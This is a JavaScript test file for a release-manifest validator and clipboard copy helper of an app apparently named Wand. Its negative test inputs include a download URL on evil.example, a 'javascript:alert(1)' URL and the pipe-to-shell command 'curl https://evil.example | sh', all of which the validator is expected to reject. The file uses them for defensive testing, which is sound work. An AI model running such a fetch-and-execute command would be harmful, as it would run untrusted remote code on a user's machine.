import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { validateRelease, copyCommand, appInstallCommand } from "./release.js";
const source = JSON.parse(
  await readFile(new URL("./release.json", import.meta.url)),
);

test("only release assets and the established installer commands are accepted", () => {
  assert.equal(validateRelease(source), source);
  for (const url of [
    "https://evil.example/Wand-macOS-arm64.zip",
    "https://github.com/elsewhere/repo/releases/download/v1/Wand-macOS-arm64.zip",
    "javascript:alert(1)",
  ]) {
    const value = structuredClone(source);
    value.macos.url = url;
    assert.throws(() => validateRelease(value));
  }
  const value = structuredClone(source);
  value.core.command = "curl https://evil.example | sh";
  assert.throws(() => validateRelease(value));
});
test("unpublished and published manifests remain distinct", () => {
  for (const available of [false, true]) {
    const value = structuredClone(source);
    value.macos.available = value.core.available = available;
    assert.equal(validateRelease(value).macos.available, available);
  }
  const value = structuredClone(source);
  value.macos.available = "true";
  assert.throws(() => validateRelease(value));
});
test("copy succeeds only after the clipboard accepts the exact text", async () => {
  let copied;
  await copyCommand(source.core.command, {
    writeText: async (value) => {
      copied = value;
    },
  });
  assert.equal(copied, source.core.command);
  await assert.rejects(copyCommand("command", null));
  await assert.rejects(
    copyCommand("command", {
      writeText: async () => {
        throw new Error("Denied");
      },
    }),
  );
});

test("client installer command is separate from Core and copied verbatim", async () => {
  assert.equal(
    appInstallCommand,
    "curl -fsSL https://wandapp.github.io/install-app.sh | sh",
  );
  assert.notEqual(appInstallCommand, source.core.command);
  let copied;
  await copyCommand(appInstallCommand, {
    writeText: async (value) => {
      copied = value;
    },
  });
  assert.equal(copied, appInstallCommand);
});
